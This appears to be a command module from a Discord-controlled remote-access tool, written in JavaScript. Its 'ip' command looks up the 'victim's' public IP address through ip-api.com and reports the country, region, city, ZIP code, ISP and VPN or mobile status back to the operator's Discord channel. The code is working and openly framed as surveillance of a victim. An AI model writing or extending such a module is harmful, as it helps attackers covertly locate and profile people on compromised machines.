const { SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const axios = require('axios');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('ip')
    .setDescription('Get info about victim\'s IP address')
    .addStringOption(option => option
      .setName('ip')
      .setDescription('An IP address (leave empty for victim\'s IP address)')
      .setMinLength(7)
    )
    .setDMPermission(false),

  async run(interaction, client, args) {
    const ip = interaction.options ? args.getString('ip') : args[0];
    const requestFields = [
      'query', 'country', 'region', 'regionName', 'city', 'zip', 'isp', 'status', 'message', 'proxy', 'mobile'
    ];

    try {
      const { data: ipDetails } = await axios.get(`http://ip-api.com/json/${ip ?? ''}?fields=${requestFields.join(',')}`);
      if (ipDetails.status === 'fail') await Promise.reject({ message: ipDetails.message });
      const fields = [
        `**IP Address:** ${ipDetails.query}`,
        `**Country:** ${ipDetails.country}`,
        `**Region:** ${ipDetails.regionName}/${ipDetails.region}`,
        `**City:** ${ipDetails.city}`,
        `**ZIP Code:** ${ipDetails.zip}`,
        `**ISP:** ${ipDetails.isp}`,
        `**Proxy/VPN:** ${ipDetails.proxy ? '✅' : '❌'}`,
        `**LTE (mobile):** ${ipDetails.mobile ? '✅' : '❌'}`,
      ];
      const embed = new EmbedBuilder()
        .setTitle(`IP details for ${ipDetails.query}`)
        .setDescription(fields.join('\n'))
        .setTimestamp(Date.now());

      await interaction.reply({
        embeds: [embed]
      });
    } catch (e) {
      interaction.reply({
        content: `Failed to fetch IP details: ${e.message}`
      });
    }
  }
}
